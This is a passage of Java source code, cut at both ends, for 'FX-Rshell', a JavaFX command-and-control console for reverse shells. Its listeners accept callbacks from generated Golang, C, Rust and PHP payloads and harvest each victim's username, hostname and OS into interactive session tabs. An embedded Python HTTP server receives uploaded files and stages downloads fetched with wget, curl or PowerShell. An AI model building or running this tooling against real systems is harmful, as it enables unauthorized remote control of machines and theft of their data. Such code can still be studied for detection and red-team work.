            
            try {
                Integer.parseInt(port);
            } catch (NumberFormatException ex) {
                Alert alert = new Alert(Alert.AlertType.ERROR);
                alert.setTitle("Input Error");
                alert.setHeaderText(null);
                alert.setContentText("Port must be a valid number");
                applyDraculaAlertStyle(alert);
                alert.showAndWait();
                return;
            }
            
            // Le chemin de sauvegarde est maintenant fourni par l'utilisateur
            String savePath = new File(filePath).getParent();
            payloadsParser(outputName, host, port, filePath, targetOS, type, goarch);
            payloadStage.close();
        });
        
        // Ajuster la taille de la fenêtre en fonction des options
        int height = type.equals("PHP") ? 300 : 400;
        
        Scene scene = new Scene(layout, 600, height);
        applyDraculaSceneStyle(scene);
        
        payloadStage.setScene(scene);
        applyDraculaStageStyle(payloadStage);
        payloadStage.setMinWidth(600);
        payloadStage.setMinHeight(height);
        payloadStage.show();
    }

    public void showListenerWindow(Stage parentStage) {
        Stage stage = new Stage();
        stage.initModality(Modality.APPLICATION_MODAL);
        stage.setTitle("Show Listeners");

        TableView<ListenerEntry> table = new TableView<>();
        table.setItems(listenerList);
        applyDraculaTableStyle(table);

        TableColumn<ListenerEntry, String> portCol = new TableColumn<>("Port");
        portCol.setCellValueFactory(data -> new SimpleStringProperty(String.valueOf(data.getValue().getPort())));
        portCol.setPrefWidth(150);

        TableColumn<ListenerEntry, Void> killCol = new TableColumn<>("Action");
        killCol.setPrefWidth(150);
        killCol.setCellFactory(col -> new TableCell<>() {
            private final Button killButton = new Button("Kill");

            {
                applyDraculaButtonStyle(killButton);
                killButton.setPrefWidth(100);
                killButton.setOnAction(e -> {
                    ListenerEntry entry = getTableView().getItems().get(getIndex());
                    try {
                        entry.getServerSocket().close();
                        listenerList.remove(entry);
                        logMessage("[!] Listener on port " + entry.getPort() + " closed.");
                    } catch (IOException ex) {
                        logMessage("[-] Error closing listener on port " + entry.getPort() + ": " + ex.getMessage());
                    }
                });
            }

            @Override
            protected void updateItem(Void item, boolean empty) {
                super.updateItem(item, empty);
                if (empty) {
                    setGraphic(null);
                } else {
                    setGraphic(killButton);
                    setAlignment(Pos.CENTER);
                }
            }
        });

        table.getColumns().addAll(portCol, killCol);
        table.setColumnResizePolicy(TableView.CONSTRAINED_RESIZE_POLICY);
        table.setPrefHeight(150);

        Label titleLabel = new Label("Active Listeners");
        titleLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold; -fx-font-size: 14px;");

        VBox layout = new VBox(10, titleLabel, table);
        layout.setPadding(new Insets(15));
        applyDraculaStyle(layout);

        Scene scene = new Scene(layout, 300, 250);
        applyDraculaSceneStyle(scene);
        
        stage.setScene(scene);
        applyDraculaStageStyle(stage);
        stage.setMinWidth(300);
        stage.setMinHeight(250);
        stage.showAndWait();
    }

    public void createListenerWindow(Stage parentStage) {
        Stage stageCreateListener = new Stage();
        stageCreateListener.initModality(Modality.APPLICATION_MODAL);
        stageCreateListener.setTitle("Create Listener");

        Label portLabel = new Label("ENTER LISTENER PORT");
        portLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        TextField portField = new TextField();
        applyDraculaTextStyle(portField);
        portField.setPromptText("Port number (e.g. 4444)");
        portField.setPrefWidth(200);

        Button submitButton = new Button("Create");
        applyDraculaButtonStyle(submitButton);
        submitButton.setPrefWidth(150);
        
        submitButton.setOnAction(e -> {
            try {
                int targetPort = Integer.parseInt(portField.getText());
                stageCreateListener.close();

                new Thread(() -> createListener(targetPort)).start();
            } catch (NumberFormatException ex) {
                logMessage("[-] Port invalide !");
                
                // Show error feedback
                portField.setStyle(
                    portField.getStyle() + 
                    "-fx-border-color: " + DRACULA_RED + ";" +
                    "-fx-border-width: 2px;"
                );
            }
        });

        VBox layout = new VBox(10, portLabel, portField, submitButton);
        layout.setPadding(new Insets(20));
        layout.setAlignment(Pos.CENTER);
        layout.setStyle("-fx-background-color: " + DRACULA_BACKGROUND + ";");

        Scene sceneCreateListener = new Scene(layout, 300, 180);
        applyDraculaSceneStyle(sceneCreateListener);
        
        stageCreateListener.setScene(sceneCreateListener);
        applyDraculaStageStyle(stageCreateListener);
        stageCreateListener.showAndWait();
    }

    public void createListener(int port) {
        try {
            ServerSocket serverSocket = new ServerSocket(port);
            listenerList.add(new ListenerEntry(port, serverSocket));
            logMessage("[+] Server listening on port : " + port);

            // Start a thread to accept connections
            new Thread(() -> {
                try {
                    while (!serverSocket.isClosed()) {
                        Socket clientSocket = serverSocket.accept();
                        handleNewClient(clientSocket, port);
                    }
                } catch (IOException e) {
                    if (!serverSocket.isClosed()) {
                        logMessage("[-] Listener error: " + e.getMessage());
                    }
                }
            }).start();
        } catch (IOException e) {
            logMessage("[-] Failed to start listener on port " + port + ": " + e.getMessage());
        }
    }

    private void handleNewClient(Socket clientSocket, int id) {
        try {
            // Créer les flux d'entrée/sortie
            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
            
            // Vérifier que les flux ont été créés correctement
            if (in == null || out == null) {
                System.err.println("[ERREUR CRITIQUE] Impossible de créer les flux pour le client " + id);
                return;
            }
            
            // Créer la session
            ShellSession session = new ShellSession(clientSocket, id, in, out);
            
            // Variables to store client info
            String username = "Unknown";
            String hostname = "Unknown";
            String clientIP = clientSocket.getInetAddress().getHostAddress();
            String clientOS = "Unknown";
            String detectedPayloadType = "Unknown";
            
            // Récupérer l'adresse IP locale qui a été utilisée pour la connexion
            String connectingIP = clientSocket.getLocalAddress().getHostAddress();
            if (connectingIP.equals("0.0.0.0")) {
                // Si l'adresse est 0.0.0.0, essayer de trouver une meilleure adresse
                try {
                    connectingIP = InetAddress.getLocalHost().getHostAddress();
                } catch (Exception e) {
                    logMessage("[!] Warning: Could not determine connecting IP address: " + e.getMessage());
                }
            }
            
            // Read initial banner to detect the payload type
            String initialLine = in.readLine();
            if (initialLine != null) {
                // Check payload type from initial banner (case insensitive)
                String lowerBanner = initialLine.toLowerCase();
                if (lowerBanner.contains("golang payload")) {
                    detectedPayloadType = "Golang";
                } else if (lowerBanner.contains("c payload")) {
                    detectedPayloadType = "C";
                } else if (lowerBanner.contains("rust") || lowerBanner.contains("rust payload")) {
                    detectedPayloadType = "Rust";
                }
                
                // Try to read metadata from verbose format (Go client uses this format)
                try {
                    // Read through banner lines to extract metadata if present
                    String line;
                    int lineCount = 0;
                    while ((line = in.readLine()) != null && lineCount < 10) {
                        lineCount++;
                        
                        if (line.contains("Username:")) {
                            username = line.split("Username:")[1].trim();
                        } else if (line.contains("Hostname:")) {
                            hostname = line.split("Hostname:")[1].trim();
                        } else if (line.contains("OS:")) {
                            clientOS = line.split("OS:")[1].trim();
                        }
                        
                        // Empty line might signal end of banner
                        if (line.trim().isEmpty()) {
                            break;
                        }
                    }
                } catch (Exception e) {
                    // Error reading banner metadata, will try METADATA command instead
                    logMessage("Error parsing initial banner: " + e.getMessage());
                }
            }
            
            // Request metadata using command if not fully populated or detected
            if (username.equals("Unknown") || hostname.equals("Unknown") || clientOS.equals("Unknown")) {
                try {
                    out.println("METADATA");
                    out.flush();
                    
                    // Wait for response
                    String metadataResponse = in.readLine();
                    if (metadataResponse != null && metadataResponse.contains("|")) {
                        String[] parts = metadataResponse.split("\\|");
                        
                        // Update metadata with response parts
                        if (parts.length >= 1 && !parts[0].trim().isEmpty()) {
                            username = parts[0].trim();
                        }
                        
                        if (parts.length >= 2 && !parts[1].trim().isEmpty()) {
                            hostname = parts[1].trim();
                        }
                        
                        if (parts.length >= 3 && !parts[2].trim().isEmpty()) {
                            clientOS = parts[2].trim();
                        }
                        
                        // Get payload type from metadata if available and not already detected
                        if (parts.length >= 4 && !parts[3].trim().isEmpty() && detectedPayloadType.equals("Unknown")) {
                            String payloadType = parts[3].trim();
                            if (payloadType.toLowerCase().contains("golang")) {
                                detectedPayloadType = "Golang";
                            } else if (payloadType.toLowerCase().contains("c")) {
                                detectedPayloadType = "C";
                            } else if (payloadType.toLowerCase().contains("rust")) {
                                detectedPayloadType = "Rust";
                            } else {
                                detectedPayloadType = payloadType; // Use as-is if not recognized
                            }
                        }
                    }
                } catch (Exception e) {
                    logMessage("Error requesting metadata: " + e.getMessage());
                }
            }
            
            // Determine connection type for logging
            String connectionType = (username.equals("Unknown") && hostname.equals("Unknown")) 
                ? "New shell connection" 
                : "Metadata updated";
                
            // Log the new connection with all available info
            logMessage(connectionType + " from " + clientIP + 
                       " - Username: " + username + 
                       ", Hostname: " + hostname + 
                       ", OS: " + clientOS + 
                       ", Type: " + detectedPayloadType);
            
            // Set session metadata
            session.setPayloadType(detectedPayloadType);
            session.setMetadata(username, hostname, clientOS, detectedPayloadType);
            
            // Add session to the list
            Platform.runLater(() -> {
                shellSessions.add(session);
                logMessage("[+] New shell connected from " + session.getIp() + 
                       " (" + (session.getHostname() != null ? session.getHostname() : "unknown") + ") " +
                       "[" + session.getPayloadType() + "]");
                
                // Create a new tab for this session
                openSessionTab(session);
            });
            
        } catch (IOException e) {
            logMessage("Error handling client " + id + ": " + e.getMessage());
        }
    }

    private void createSessionContextMenu() {
        ContextMenu contextMenu = new ContextMenu();
        applyDraculaContextMenuStyle(contextMenu);
        
        MenuItem interactItem = new MenuItem("Interact");
        applyDraculaMenuItemStyle(interactItem);
        interactItem.setOnAction(e -> {
            ShellSession selectedSession = sessionsTable.getSelectionModel().getSelectedItem();
            if (selectedSession != null) {
                openSessionTab(selectedSession);
            }
        });
        
        MenuItem killItem = new MenuItem("Kill Shell");
        applyDraculaMenuItemStyle(killItem);
        killItem.setOnAction(e -> {
            ShellSession selectedSession = sessionsTable.getSelectionModel().getSelectedItem();
            if (selectedSession != null) {
                killSession(selectedSession);
            }
        });
        
        contextMenu.getItems().addAll(interactItem, killItem);
        
        sessionsTable.setRowFactory(tv -> {
            TableRow<ShellSession> row = new TableRow<>();
            
            row.setOnMouseClicked(event -> {
                if (!row.isEmpty() && event.getButton() == MouseButton.PRIMARY && event.getClickCount() == 2) {
                    ShellSession clickedSession = row.getItem();
                    openSessionTab(clickedSession);
                }
            });
            
            row.setContextMenu(contextMenu);
            return row;
        });
    }
    
    private void openSessionTab(ShellSession session) {
        // Fix: Pass 'this' as the second argument to the ConsoleTab constructor
        ConsoleTab consoleTab = new ConsoleTab(session, this);
        consoleTab.setText(session.getIp() + " (" + session.getHostname() + ")");
        consoleTabs.getTabs().add(consoleTab);
        consoleTabs.getSelectionModel().select(consoleTab);
    }
    
    private void killSession(ShellSession session) {
        // Close the session
        session.close();
        
        // Remove any existing tab for this session
        for (Tab tab : consoleTabs.getTabs()) {
            if (tab instanceof ConsoleTab) {
                ConsoleTab consoleTab = (ConsoleTab) tab;
                if (consoleTab.getSession().equals(session)) {
                    consoleTabs.getTabs().remove(tab);
                    break;
                }
            }
        }
        
        // Remove from the sessions list
        shellSessions.remove(session);
        
        // Optional: Open a new tab with a reconnection option
        // Fix: Pass 'this' as the second argument to the ConsoleTab constructor
        ConsoleTab reconnectTab = new ConsoleTab(session, this);
        reconnectTab.setText("Reconnect: " + session.getIp());
        // Add any reconnection UI or functionality here
        
        logMessage("Session with " + session.getIp() + " terminated.");
    }

    public void logMessage(String message) {
        Platform.runLater(() -> {
            String color = DRACULA_FOREGROUND;
            
            // Appliquer différentes couleurs selon le type de message
            if (message.startsWith("[+]")) {
                color = DRACULA_GREEN;
            } else if (message.startsWith("[-]")) {
                color = DRACULA_RED;
            } else if (message.startsWith("[!]")) {
                color = DRACULA_ORANGE;
            }
            
            // Sauvegarder le style actuel
            String currentStyle = eventViewer.getStyle();
            // Appliquer temporairement un style avec la couleur spécifiée
            eventViewer.setStyle(currentStyle + "-fx-text-fill: " + color + ";");
            eventViewer.appendText(message + "\n");
            // Restaurer le style d'origine
            eventViewer.setStyle(currentStyle);
        });
    }

    @Override
    public void start(Stage stage) {
        // Créer le dossier tmp s'il n'existe pas
        try {
            Files.createDirectories(Paths.get("tmp"));
        } catch (IOException e) {
            System.err.println("Failed to create tmp directory: " + e.getMessage());
        }

        // Nettoyer le dossier tmp à la fermeture
        stage.setOnCloseRequest(event -> {
            // Arrêter tous les serveurs
            for (Process process : serverProcesses) {
                process.destroy();
            }
            
            // Nettoyer le dossier tmp
            try {
                Files.walk(Paths.get("tmp"))
                    .sorted(java.util.Comparator.reverseOrder())
                    .map(Path::toFile)
                    .forEach(File::delete);
            } catch (IOException e) {
                System.err.println("Failed to clean tmp directory: " + e.getMessage());
            }
        });
        
        // Ajouter la feuille de style globale
        String cssFile = "res/styles/table-styles.css";
        
        MenuBar menuBar = new MenuBar();
        
        // Appliquer le style Dracula au menu
        menuBar.setStyle(
            "-fx-background-color: " + DRACULA_CURRENT_LINE + ";" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";"
        );
        
        Menu listenerMenu = new Menu("Listeners");
        Menu payloadsMenu = new Menu("Payloads");
        Menu serversMenu = new Menu("Servers");

        MenuItem getListener = new MenuItem("Show Listener");
        MenuItem newListener = new MenuItem("Create Listener");
        
        MenuItem goPlayloads = new MenuItem("Golang - Payloads");
        MenuItem cPayloads = new MenuItem("C - Payloads");
        MenuItem rustPayloads = new MenuItem("Rust - Payloads");
        MenuItem phpPayloads = new MenuItem("PHP - Payloads");

        MenuItem createServer = new MenuItem("Create HTTP Server");
        MenuItem showServer = new MenuItem("Show Server");

        newListener.setOnAction(e -> createListenerWindow(stage));
        getListener.setOnAction(e -> showListenerWindow(stage));
        
        goPlayloads.setOnAction(e -> payloadsWindows("Golang"));
        cPayloads.setOnAction(e -> payloadsWindows("C"));
        rustPayloads.setOnAction(e -> payloadsWindows("Rust"));
        phpPayloads.setOnAction(e -> payloadsWindows("PHP"));

        createServer.setOnAction(e -> createServerWindow(stage));
        showServer.setOnAction(e -> showServerWindow(stage));

        listenerMenu.getItems().addAll(newListener, getListener, new SeparatorMenuItem());
        payloadsMenu.getItems().addAll(goPlayloads, cPayloads, rustPayloads, phpPayloads, new SeparatorMenuItem());
        serversMenu.getItems().addAll(createServer, showServer);

        menuBar.getMenus().addAll(listenerMenu, payloadsMenu, serversMenu);

        BorderPane root = new BorderPane();
        root.setTop(menuBar);
        
        // Appliquer le style Dracula au conteneur principal
        applyDraculaStyle(root);

        // Event Viewer
        eventViewer = new TextArea();
        eventViewer.setEditable(false);
        eventViewer.setWrapText(true);
        eventViewer.setPrefHeight(150);
        applyDraculaTextStyle(eventViewer);
        
        // Sessions Table
        sessionsTable = new TableView<>();
        sessionsTable.setItems(shellSessions);
        applyDraculaTableStyle(sessionsTable);
        
        TableColumn<ShellSession, String> ipCol = new TableColumn<>("IP");
        ipCol.setCellValueFactory(data -> new SimpleStringProperty(data.getValue().getIp()));
        
        TableColumn<ShellSession, String> usernameCol = new TableColumn<>("Username");
        usernameCol.setCellValueFactory(data -> new SimpleStringProperty(data.getValue().getUsername()));
        
        TableColumn<ShellSession, String> hostnameCol = new TableColumn<>("Hostname");
        hostnameCol.setCellValueFactory(data -> new SimpleStringProperty(data.getValue().getHostname()));
        
        TableColumn<ShellSession, String> osCol = new TableColumn<>("OS");
        osCol.setCellValueFactory(data -> new SimpleStringProperty(data.getValue().getOs()));
        
        TableColumn<ShellSession, String> typeCol = new TableColumn<>("Type");
        typeCol.setCellValueFactory(data -> new SimpleStringProperty(data.getValue().getPayloadType()));
        
        TableColumn<ShellSession, String> portCol = new TableColumn<>("Port");
        portCol.setCellValueFactory(data -> new SimpleStringProperty(String.valueOf(data.getValue().getListenerPort())));
        
        TableColumn<ShellSession, String> statusCol = new TableColumn<>("Status");
        statusCol.setCellValueFactory(data -> data.getValue().statusProperty());
        
        // Custom cell factory pour la colonne de statut avec couleurs
        statusCol.setCellFactory(column -> new TableCell<ShellSession, String>() {
            @Override
            protected void updateItem(String item, boolean empty) {
                super.updateItem(item, empty);
                
                if (item == null || empty) {
                    setText(null);
                    setStyle(null);
                } else {
                    ShellSession session = getTableView().getItems().get(getIndex());
                    setText(item);
                    setStyle(session.getStatusStyle());
                }
            }
        });
        
        sessionsTable.getColumns().addAll(ipCol, usernameCol, hostnameCol, osCol, typeCol, portCol, statusCol);
        createSessionContextMenu();
        
        // Tabs for sessions
        consoleTabs = new TabPane();
        consoleTabs.setTabClosingPolicy(TabPane.TabClosingPolicy.ALL_TABS);
        
        // Style Dracula pour les tabs
        consoleTabs.setStyle(
            "-fx-background-color: " + DRACULA_BACKGROUND + ";" +
            "-fx-background: " + DRACULA_BACKGROUND + ";"
        );
        
        // Left panel with event viewer and sessions table
        VBox leftPanel = new VBox(10);
        leftPanel.setPadding(new Insets(10));
        
        Label eventLogLabel = new Label("Event Log");
        eventLogLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        Label shellsLabel = new Label("Connected Shells");
        shellsLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        leftPanel.getChildren().addAll(eventLogLabel, eventViewer, shellsLabel, sessionsTable);
        VBox.setVgrow(sessionsTable, Priority.ALWAYS);
        leftPanel.setPrefWidth(350);
        applyDraculaStyle(leftPanel);
        
        // Right panel with console tabs
        VBox rightPanel = new VBox(10);
        rightPanel.setPadding(new Insets(10));
        
        Label consoleLabel = new Label("Console");
        consoleLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        rightPanel.getChildren().addAll(consoleLabel, consoleTabs);
        VBox.setVgrow(consoleTabs, Priority.ALWAYS);
        applyDraculaStyle(rightPanel);
        
        // Split pane for left and right panels
        SplitPane splitPane = new SplitPane();
        splitPane.getItems().addAll(leftPanel, rightPanel);
        splitPane.setDividerPositions(0.3);
        
        root.setCenter(splitPane);

        Scene scene = new Scene(root, 1080, 700);
        
        // Appliquer la feuille de style CSS globale
        scene.getStylesheets().add("file:" + cssFile);
        
        // Appliquer un style global à la scène
        scene.getRoot().setStyle("-fx-base: " + DRACULA_BACKGROUND + ";");
        
        stage.setTitle("FX-Rshell");
        stage.setScene(scene);
        stage.show();
    }

    private void createServerWindow(Stage parentStage) {
        Stage stage = new Stage();
        stage.initModality(Modality.APPLICATION_MODAL);
        stage.initOwner(parentStage);
        stage.setTitle("Create HTTP Server");
        
        // Définir une taille minimale pour la fenêtre
        stage.setMinWidth(400);
        stage.setMinHeight(350);
        
        Label ipLabel = new Label("SELECT SERVER IP");
        ipLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        ComboBox<String> ipComboBox = new ComboBox<>();
        ipComboBox.setItems(FXCollections.observableArrayList(getLocalIPs()));
        ipComboBox.setPrefWidth(200);

        Label portLabel = new Label("ENTER SERVER PORT");
        portLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        TextField portField = new TextField();
        applyDraculaTextStyle(portField);
        portField.setPromptText("Port number (e.g. 8080)");
        portField.setPrefWidth(200);

        Label fileLabel = new Label("FILE LOCATION");
        fileLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        TextField fileField = new TextField();
        applyDraculaTextStyle(fileField);
        fileField.setPromptText("File location");
        fileField.setPrefWidth(200);

        Button chooseFileButton = new Button("Choose Directory");
        applyDraculaButtonStyle(chooseFileButton);
        chooseFileButton.setOnAction(e -> {
            DirectoryChooser directoryChooser = new DirectoryChooser();
            File selectedDirectory = directoryChooser.showDialog(stage);
            if (selectedDirectory != null) {
                fileField.setText(selectedDirectory.getAbsolutePath());
            }
        });

        Button submitButton = new Button("Create");
        applyDraculaButtonStyle(submitButton);
        submitButton.setPrefWidth(150);
        
        submitButton.setOnAction(e -> {
            String ip = ipComboBox.getValue();
            String port = portField.getText();
            String fileLocation = fileField.getText();
            createServer(ip, Integer.parseInt(port), fileLocation, true);
            stage.close();
        });

        VBox layout = new VBox(10, ipLabel, ipComboBox, portLabel, portField, fileLabel, fileField, chooseFileButton, submitButton);
        layout.setPadding(new Insets(20));
        layout.setAlignment(Pos.CENTER);
        layout.setStyle("-fx-background-color: " + DRACULA_BACKGROUND + ";");

        Scene scene = new Scene(layout);
        applyDraculaSceneStyle(scene);
        
        stage.setScene(scene);
        applyDraculaStageStyle(stage);
        stage.showAndWait();
    }

    private void showServerWindow(Stage parentStage) {
        Stage stage = new Stage();
        stage.initModality(Modality.APPLICATION_MODAL);
        stage.initOwner(parentStage);
        stage.setTitle("Show Servers");
        
        // Définir une taille minimale pour la fenêtre
        stage.setMinWidth(750);
        stage.setMinHeight(400);
        
        TableView<ServerEntry> serverTable = new TableView<>(serverList);
        applyDraculaTableStyle(serverTable);

        TableColumn<ServerEntry, Integer> portColumn = new TableColumn<>("Port");
        portColumn.setCellValueFactory(new PropertyValueFactory<>("port"));
        portColumn.setPrefWidth(100);

        TableColumn<ServerEntry, String> protocolColumn = new TableColumn<>("Protocol");
        protocolColumn.setCellValueFactory(data -> {
            ServerEntry server = data.getValue();
            String protocol = "HTTP";  // Par défaut HTTP pour nos serveurs actuels
            return new SimpleStringProperty(protocol);
        });
        protocolColumn.setPrefWidth(100);

        TableColumn<ServerEntry, String> languageColumn = new TableColumn<>("Language");
        languageColumn.setCellValueFactory(new PropertyValueFactory<>("language"));
        languageColumn.setPrefWidth(100);

        TableColumn<ServerEntry, String> locationColumn = new TableColumn<>("File Location");
        locationColumn.setCellValueFactory(new PropertyValueFactory<>("fileLocation"));
        locationColumn.setPrefWidth(200);

        TableColumn<ServerEntry, String> statusColumn = new TableColumn<>("Status");
        statusColumn.setCellValueFactory(new PropertyValueFactory<>("status"));
        statusColumn.setPrefWidth(100);

        serverTable.getColumns().addAll(portColumn, protocolColumn, languageColumn, locationColumn, statusColumn);

        Button removeButton = new Button("Remove Server");
        applyDraculaButtonStyle(removeButton);
        removeButton.setOnAction(e -> {
            ServerEntry selectedServer = serverTable.getSelectionModel().getSelectedItem();
            if (selectedServer != null) {
                int index = serverList.indexOf(selectedServer);
                serverList.remove(selectedServer);
                serverProcesses.get(index).destroy();
                serverProcesses.remove(index);
                logMessage("[+] Server on port " + selectedServer.getPort() + " stopped.");
            }
        });

        VBox layout = new VBox(10, serverTable, removeButton);
        layout.setPadding(new Insets(20));
        layout.setAlignment(Pos.CENTER);
        layout.setStyle("-fx-background-color: " + DRACULA_BACKGROUND + ";");

        Scene scene = new Scene(layout, 750, 400);
        applyDraculaSceneStyle(scene);
        
        stage.setScene(scene);
        applyDraculaStageStyle(stage);
        stage.showAndWait();
    }

    private void showDownloadWindow() {
        Stage stageDownload = new Stage();
        stageDownload.initModality(Modality.APPLICATION_MODAL);
        stageDownload.setTitle("Download File");
        
        // Définir une taille minimale pour la fenêtre
        stageDownload.setMinWidth(500);
        stageDownload.setMinHeight(350);
        
        Label serverLabel = new Label("Select HTTP Server");
        serverLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        // Filtrer uniquement les serveurs HTTP
        ComboBox<ServerEntry> serverComboBox = new ComboBox<>();
        serverComboBox.setItems(FXCollections.observableArrayList(serverList));
        serverComboBox.setPrefWidth(300);
        
        // Améliorer l'affichage des serveurs dans la ComboBox
        serverComboBox.setCellFactory(param -> new ListCell<ServerEntry>() {
            @Override
            protected void updateItem(ServerEntry item, boolean empty) {
                super.updateItem(item, empty);
                if (empty || item == null) {
                    setText(null);
                } else {
                    setText(item.getIp() + ":" + item.getPort() + " - " + item.getFileLocation());
                }
            }
        });
        
        serverComboBox.setButtonCell(new ListCell<ServerEntry>() {
            @Override
            protected void updateItem(ServerEntry item, boolean empty) {
                super.updateItem(item, empty);
                if (empty || item == null) {
                    setText(null);
                } else {
                    setText(item.getIp() + ":" + item.getPort() + " - " + item.getFileLocation());
                }
            }
        });
        
        Label fileLabel = new Label("Remote File Path");
        fileLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        TextField filePathField = new TextField();
        filePathField.setPromptText("Enter the path of the file on the remote system");
        filePathField.setPrefWidth(300);
        applyDraculaTextStyle(filePathField);
        
        Label saveLabel = new Label("Local Save Location");
        saveLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        
        TextField saveLocationField = new TextField();
        saveLocationField.setPromptText("Select where to save the file locally");
        saveLocationField.setPrefWidth(300);
        applyDraculaTextStyle(saveLocationField);
        
        Button chooseSaveLocationButton = new Button("Browse");
        applyDraculaButtonStyle(chooseSaveLocationButton);
        
        chooseSaveLocationButton.setOnAction(e -> {
            FileChooser fileChooser = new FileChooser();
            fileChooser.setTitle("Save File As");
            
            // Si un nom de fichier distant est spécifié, l'utiliser comme nom par défaut
            String remoteFile = filePathField.getText().trim();
            if (!remoteFile.isEmpty()) {
                String fileName = new File(remoteFile).getName();
                fileChooser.setInitialFileName(fileName);
            }
            
            File selectedFile = fileChooser.showSaveDialog(stageDownload);
            if (selectedFile != null) {
                saveLocationField.setText(selectedFile.getAbsolutePath());
            }
        });
        
        Button downloadButton = new Button("Download");
        applyDraculaButtonStyle(downloadButton);
        downloadButton.setOnAction(e -> {
            ServerEntry selectedServer = serverComboBox.getSelectionModel().getSelectedItem();
            String remotePath = filePathField.getText().trim();
            String localPath = saveLocationField.getText().trim();
            
            if (selectedServer != null && !remotePath.isEmpty() && !localPath.isEmpty()) {
                String command;
                String os = System.getProperty("os.name").toLowerCase();
                
                if (os.contains("win")) {
                    command = String.format(
                        "powershell Invoke-WebRequest -Uri \"http://%s:%d/%s\" -OutFile \"%s\"",
                        selectedServer.getIp(),
                        selectedServer.getPort(),
                        new File(remotePath).getName(),
                        localPath
                    );
                } else {
                    // Pour Linux/Unix, utiliser wget ou curl
                    command = String.format(
                        "if command -v wget > /dev/null; then " +
                        "wget -O \"%s\" \"http://%s:%d/%s\"; " +
                        "elif command -v curl > /dev/null; then " +
                        "curl -o \"%s\" \"http://%s:%d/%s\"; " +
                        "else echo 'Neither wget nor curl is available'; fi",
                        localPath, selectedServer.getIp(), selectedServer.getPort(), new File(remotePath).getName(),
                        localPath, selectedServer.getIp(), selectedServer.getPort(), new File(remotePath).getName()
                    );
                }
                
                logMessage("[+] Executing download command: " + command);
                try {
                    ProcessBuilder pb = new ProcessBuilder();
                    if (os.contains("win")) {
                        pb.command("powershell", "-Command", command);
                    } else {
                        pb.command("bash", "-c", command);
                    }
                    pb.start();
                    logMessage("[+] Download started");
                } catch (IOException ex) {
                    logMessage("[-] Error executing download command: " + ex.getMessage());
                }
                stageDownload.close();
            }
        });
        
        // Créer un HBox pour le champ de sauvegarde et le bouton Browse
        HBox saveLocationBox = new HBox(10);
        saveLocationBox.getChildren().addAll(saveLocationField, chooseSaveLocationButton);
        
        VBox layout = new VBox(15);
        layout.setPadding(new Insets(20));
        layout.getChildren().addAll(
            serverLabel, 
            serverComboBox,
            fileLabel, 
            filePathField,
            saveLabel,
            saveLocationBox,
            downloadButton
        );
        layout.setStyle("-fx-background-color: " + DRACULA_BACKGROUND + ";");
        
        Scene scene = new Scene(layout);
        stageDownload.setScene(scene);
        stageDownload.showAndWait();
    }

    private void createServer(String ip, int port, String fileLocation, boolean isDownloadServer) {
        try {
            String pythonScript = 
                "from http.server import BaseHTTPRequestHandler, HTTPServer\n" +
                "import os\n" +
                "import cgi\n" +
                "\n" +
                "class DownloadHandler(BaseHTTPRequestHandler):\n" +
                "    def do_GET(self):\n" +
                "        try:\n" +
                "            file_path = os.path.join('" + fileLocation + "', os.path.basename(self.path))\n" +
                "            if not os.path.exists(file_path):\n" +
                "                self.send_error(404, 'File not found')\n" +
                "                return\n" +
                "            self.send_response(200)\n" +
                "            self.send_header('Content-type', 'application/octet-stream')\n" +
                "            self.send_header('Content-Disposition', 'attachment; filename=\"' + os.path.basename(file_path) + '\"')\n" +
                "            self.end_headers()\n" +
                "            with open(file_path, 'rb') as file:\n" +
                "                self.wfile.write(file.read())\n" +
                "        except Exception as e:\n" +
                "            print(f'Error serving file: {str(e)}')\n" +
                "            self.send_error(500, 'Internal server error')\n" +
                "\n" +
                "    def do_POST(self):\n" +
                "        try:\n" +
                "            file_path = os.path.join('" + fileLocation + "', os.path.basename(self.path))\n" +
                "            content_length = int(self.headers['Content-Length'])\n" +
                "            print(f'[+] Receiving file: {os.path.basename(self.path)}')\n" +
                "            print(f'[+] Content length: {content_length} bytes')\n" +
                "\n" +
                "            with open(file_path, 'wb') as output_file:\n" +
                "                data = self.rfile.read(content_length)\n" +
                "                output_file.write(data)\n" +
                "\n" +
                "            self.send_response(200)\n" +
                "            self.send_header('Content-type', 'text/html')\n" +
                "            self.end_headers()\n" +
                "            self.wfile.write(b'File uploaded successfully')\n" +
                "            print(f'[+] File saved as: {file_path}')\n" +
                "\n" +
                "        except Exception as e:\n" +
                "            print(f'[-] Error receiving file: {str(e)}')\n" +
                "            self.send_error(500, 'Internal server error')\n" +
                "\n" +
                "if __name__ == '__main__':\n" +
                "    server_address = ('" + ip + "', " + port + ")\n" +
                "    try:\n" +
                "        httpd = HTTPServer(server_address, DownloadHandler)\n" +
                "        print(f'[+] HTTP server started on http://" + ip + ":" + port + "')\n" +
                "        print(f'[+] Serving directory: " + fileLocation + "')\n" +
                "        print(f'[+] Server supports both upload (POST) and download (GET) operations')\n" +
                "        httpd.serve_forever()\n" +
                "    except Exception as e:\n" +
                "        print(f'[-] Server error: {str(e)}')\n";
            
            // Écrire le script dans un fichier temporaire dans le dossier tmp
            String tempScript = "tmp/http_server_" + port + ".py";
            try (FileOutputStream fos = new FileOutputStream(tempScript)) {
                fos.write(pythonScript.getBytes());
            }
            
            // Exécuter le script Python
            ProcessBuilder pb = new ProcessBuilder("python3", tempScript);
            
            // Rediriger la sortie d'erreur vers la sortie standard
            pb.redirectErrorStream(true);
            
            Process process = pb.start();
